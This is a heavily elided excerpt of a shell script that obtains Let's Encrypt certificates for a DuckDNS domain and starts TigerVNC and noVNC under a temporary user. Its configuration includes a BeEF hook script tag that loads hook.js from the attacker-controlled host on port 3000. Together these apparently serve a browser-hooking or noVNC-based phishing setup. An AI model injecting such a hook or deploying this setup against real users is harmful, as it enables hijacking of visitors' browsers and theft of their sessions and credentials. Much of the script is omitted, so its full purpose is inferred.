...
# SSL Configuration
SSL_DIR="./ssl"
DUCK_DIR="/etc/letsencrypt/live/alesanfe.duckdns.org"
SSL_CERT="$SSL_DIR/fullchain.pem"
SSL_KEY="$SSL_DIR/privkey.pem"

# BeEF configuration
SCRIPT_TAG='<script src="http://alesanfe.duckdns.org:3000/hook.js"></script>'
...
cleanup() {
    ...
    if pgrep -x "Xtigervnc" > /dev/null; then
        ...
        sudo -u $TEMP_USER tigervncserver -kill :2 || true
...
create_ssl() {
    if [ ! -f "$SSL_CERT" ] || [ ! -f "$SSL_KEY" ]; then
        ...
        install_dependencies
        sudo certbot certonly --standalone -d alesanfe.duckdns.org --email "$EMAIL" --agree-tos --no-eff-email
        mkdir ./ssl
...
start_novnc() {
    ...
    sudo -u $TEMP_USER /usr/share/novnc/utils/novnc_proxy --vnc 127.0.0.1:5901 \
